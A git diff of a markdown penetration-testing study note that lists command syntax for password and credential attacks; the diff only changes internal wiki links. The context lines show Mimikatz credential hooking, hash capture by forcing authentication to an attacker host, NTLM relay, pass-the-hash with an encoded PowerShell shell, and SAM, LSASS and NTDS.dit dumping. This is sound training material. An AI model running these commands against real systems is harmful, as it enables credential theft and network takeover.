@@ -1,6 +1,6 @@
 # Password Attacks — Command Appendix
 
-Part of [[COMMAND APPENDIX]]. Syntax-first reference for credential-related tools: Hydra, Hashcat, JtR, Mimikatz, Responder, ntlmrelayx, impacket PtH tools. Full context and explanations live in [[Password Attacks]].
+Part of [[COMMAND APPENDIX]]. Syntax-first reference for credential-related tools: Hydra, Hashcat, JtR, Mimikatz, Responder, ntlmrelayx, impacket PtH tools. Full context and explanations live in [[16. Password Attacks|Password Attacks]].
 
 ---
 
@@ -45,7 +45,7 @@ Key flags:
 | `-t <n>` | Parallel tasks |
 | `-I` | Skip restore file (force restart) |
 
-🔁 [[Password Attacks#16.1.1. SSH|16.1.1 SSH]], [[Password Attacks#16.1.2. RDP|16.1.2 RDP]], [[Password Attacks#16.1.3. HTTP POST Login Form|16.1.3 HTTP POST form]]
+🔁 [[16. Password Attacks#16.1.1. SSH|16.1.1 SSH]], [[16. Password Attacks#16.1.2. RDP|16.1.2 RDP]], [[16. Password Attacks#16.1.3. HTTP POST Login Form|16.1.3 HTTP POST form]]
 
 ---
 
@@ -113,7 +113,7 @@ Hash modes quick reference:
 | 22100 | BitLocker AES-CBC 128/256 | bitlocker2john $0 hash |
 | 22921 | RSA/DSA/EC key (AES-256-CBC) | ssh2john output, not all cipher modes |
 
-🔁 [[Password Attacks#16.2.2. Mutating Wordlists|16.2.2 Mutating Wordlists]], [[Password Attacks#16.3.1. Cracking NTLM|16.3.1 NTLM]], [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 Net-NTLMv2]]
+🔁 [[16. Password Attacks#16.2.2. Mutating Wordlists|16.2.2 Mutating Wordlists]], [[16. Password Attacks#16.3.1. Cracking NTLM|16.3.1 NTLM]], [[16. Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 Net-NTLMv2]]
 
 ---
 
@@ -155,7 +155,7 @@ john --wordlist=rockyou.txt backup.hash
 
 JtR vs Hashcat: use JtR for SSH keys using AES-256-CTR cipher mode (Hashcat mode 22921 only supports AES-256-CBC). `ssh2john` output starting with `$sshng$6$` = SHA-512 key derivation, AES-256-CTR -- use JtR.
 
-🔁 [[Password Attacks#16.2.4. Password Manager|16.2.4 KeePass]], [[Password Attacks#16.2.5. SSH Private Key Passphrase|16.2.5 SSH key]]
+🔁 [[16. Password Attacks#16.2.4. Password Manager|16.2.4 KeePass]], [[16. Password Attacks#16.2.5. SSH Private Key Passphrase|16.2.5 SSH key]]
 
 ---
 
@@ -178,9 +178,9 @@ misc::memssp              # Hook SSPI layer; credentials captured to C:\Windows\
 type C:\Windows\System32\mimilsa.log
 ```
 
-> On Windows Server 2022: `lsadump::sam` fails even with a SYSTEM impersonation token because Windows checks the PRIMARY process token, not the thread token. Fix: run Mimikatz via `schtasks /ru <adminuser> /rp <password>` so the admin's token IS the primary token. See [[Password Attacks#16.3.2. Passing NTLM|16.3.2 lab section]] for the full schtask command.
+> On Windows Server 2022: `lsadump::sam` fails even with a SYSTEM impersonation token because Windows checks the PRIMARY process token, not the thread token. Fix: run Mimikatz via `schtasks /ru <adminuser> /rp <password>` so the admin's token IS the primary token. See [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2 lab section]] for the full schtask command.
 
-🔁 [[Password Attacks#16.3.1. Cracking NTLM|16.3.1]], [[Password Attacks#16.3.2. Passing NTLM|16.3.2]], [[Password Attacks#16.3.5. Windows Credential Guard|16.3.5]]
+🔁 [[16. Password Attacks#16.3.1. Cracking NTLM|16.3.1]], [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2]], [[16. Password Attacks#16.3.5. Windows Credential Guard|16.3.5]]
 
 ---
 
@@ -198,7 +198,7 @@ dir \\<kali-ip>\test    # "Access is denied" is expected -- hash is still captur
 # Save the full line to a file, then crack with hashcat -m 5600
 ```
 
-🔁 [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]]
+🔁 [[16. Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]]
 
 ---
 
@@ -223,7 +223,7 @@ nc -nvlp 8080
 
 Constraint: the relayed user must have local admin on the relay target. The relay target cannot be the same machine the auth came from.
 
-🔁 [[Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4]]
+🔁 [[16. Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4]]
 
 ---
 
@@ -242,7 +242,7 @@ smbclient \\\\<target>\\<share> -U Administrator --pw-nt-hash <NThash>
 
 The LM hash portion is always 32 zeros on modern Windows (LM disabled since Vista/2008). Format: `LMhash:NThash`.
 
-🔁 [[Password Attacks#16.3.2. Passing NTLM|16.3.2]]
+🔁 [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2]]
 
 ---
 
@@ -261,7 +261,7 @@ sudo dislocker /dev/loop0p1 -uCRACKEDPASSWORD -- /media/bitlocker
 sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.4. BitLocker VHD: Full Crack + Mount Chain|PA.4]]
+🔁 [[16. Password Attacks|PA.4]]
 
 ---
 
@@ -289,7 +289,7 @@ impacket-secretsdump -sam sam.save -security security.save -system system.save L
 cut -d ':' -f 4 samhashes.txt > nthashes.txt
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.7. SAM Offline Dump|PA.7]]
+🔁 [[16. Password Attacks|PA.7]]
 
 ---
 
@@ -304,7 +304,7 @@ pypykatz lsa minidump lsass.DMP
 # Output per session: NTLM hash, SHA1 hash — take NT hash for cracking or PtH
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.8. LSASS Dump via Task Manager + pypykatz|PA.8]]
+🔁 [[16. Password Attacks|PA.8]]
 
 ---
 
@@ -324,7 +324,7 @@ nxc smb DC_IP -u admin -H NT_HASH --ntds --user Administrator
 nxc smb TARGET --local-auth -u admin -p 'Password' --sam
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.9. Remote Credential Dumping via NetExec|PA.9]]
+🔁 [[16. Password Attacks|PA.9]]
 
 ---
 
@@ -341,7 +341,7 @@ runas /savecred /user:DOMAIN\user cmd
 lazagne.exe all
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.10. Windows Credential Manager|PA.10]]
+🔁 [[16. Password Attacks|PA.10]]
 
 ---
 
@@ -361,7 +361,7 @@ type C:\inetpub\wwwroot\web.config
 Get-ChildItem -Recurse -Include *.* \\SERVER\Share | Select-String -Pattern "DOMAIN\\"
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.11. Credential Hunting in Windows Files|PA.11]]
+🔁 [[16. Password Attacks|PA.11]]
 
 ---
 
@@ -382,7 +382,7 @@ cmd.exe /c reg.exe save hklm\SYSTEM .\SYSTEM
 impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.12. NTDS.dit via VSS|PA.12]]
+🔁 [[16. Password Attacks|PA.12]]
 
 ---
 
@@ -394,7 +394,7 @@ git clone https://github.com/urbanadventurer/username-anarchy && cd username-ana
 # Generates: jsmith, j.smith, smithj, john.smith, johnsmith, etc.
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.13. Username Generation|PA.13]]
+🔁 [[16. Password Attacks|PA.13]]
 
 ---
 
@@ -411,7 +411,7 @@ git clone https://github.com/urbanadventurer/username-anarchy && cd username-ana
 netexec smb DC_IP   # → (domain:ILF.local)
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.14. kerbrute|PA.14]]
+🔁 [[16. Password Attacks|PA.14]]
 
 ---
 
@@ -440,7 +440,7 @@ Invoke-WMIExec -Target DC01 -Domain domain.local -Username username \
   -Hash NT_HASH -Command "powershell -e BASE64_SHELL"
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.18. Pass the Hash. Deep Dive|PA.18]], [[Password Attacks#16.3.2. Passing NTLM|16.3.2]]
+🔁 [[16. Password Attacks|PA.18]], [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2]]
 
 ---
 
@@ -463,7 +463,7 @@ dir \\DC01\share
 Enter-PSSession -ComputerName DC01
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.19. Pass the Ticket (PtT) from Windows|PA.19]]
+🔁 [[16. Password Attacks|PA.19]]
 
 ---
 
@@ -491,7 +491,7 @@ kinit 'MACHINE$@DOMAIN' -k -t /etc/krb5.keytab
 find / -name *keytab* -ls 2>/dev/null
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.20. Pass the Ticket (PtT) from Linux|PA.20]]
+🔁 [[16. Password Attacks|PA.20]]
 
 ---
 
@@ -514,7 +514,7 @@ export KRB5CCNAME=/tmp/user.ccache
 evil-winrm -i dc01.domain.local -r domain.local
 ```
 
-🔁 [[Password Attacks (HTB Supplementary)#PA.21. Pass the Certificate (PtC) / Shadow Credentials|PA.21]]
+🔁 [[16. Password Attacks|PA.21]]
 
 ---
 
@@ -541,7 +541,7 @@ Key differences vs Hydra:
 - `-u`/`-U` for single username vs username list (Hydra uses `-l`/`-L`)
 - Stops automatically after first hit in single-target mode (no `-f` needed)
 
-🔁 [[Login Brute Forcing (HTB Supplementary)#LBF.5. Web Services. Medusa (SSH + Internal FTP Pivot)|LBF.5 Medusa SSH+FTP chain]]
+🔁 [[16. Password Attacks|LBF.5 Medusa SSH+FTP chain]]
 
 ---
 
@@ -568,7 +568,7 @@ grep -E '^.{6,}$' jane.txt \
   > jane-filtered.txt
 ```
 
-🔁 [[Login Brute Forcing (HTB Supplementary)#LBF.6. Custom Wordlists (CUPP + username-anarchy + grep filtering)|LBF.6 full workflow]]
+🔁 [[16. Password Attacks|LBF.6 full workflow]]
 
 ---
 
